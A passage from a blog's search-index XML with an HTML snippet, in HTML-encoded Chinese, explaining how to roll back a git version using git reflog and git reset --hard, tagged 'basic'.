href="#git-&#x7248;&#x672C;&#x56DE;&#x9000;" class="headerlink" title="git &#x7248;&#x672C;&#x56DE;&#x9000;"></a>git &#x7248;&#x672C;&#x56DE;&#x9000;</h2><p>&#x5728;&#x4E00;&#x4E9B;&#x9519;&#x8BEF;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;, &#x9700;&#x8981;&#x5C06;&#x7248;&#x672C;&#x56DE;&#x9000;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reflog <span class="hljs-comment">#&#x67E5;&#x770B;&#x7248;&#x672C;&#x53F7;&#x4FE1;&#x606F;</span></span><br><span class="line">git reset --hard HEAD^ <span class="hljs-comment">#&#x56DE;&#x9000;&#x5230;&#x4E0A;&#x4E00;&#x4E2A;&#x7248;&#x672C;, &#x4E24;&#x4E2A;^^&#x8868;&#x793A;&#x4E0A;&#x4E0A;&#x4E2A;</span></span><br><span class="line">git reset --hard (&#x7248;&#x672C;&#x53F7;)</span><br></pre></td></tr></tbody></table></figure><p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
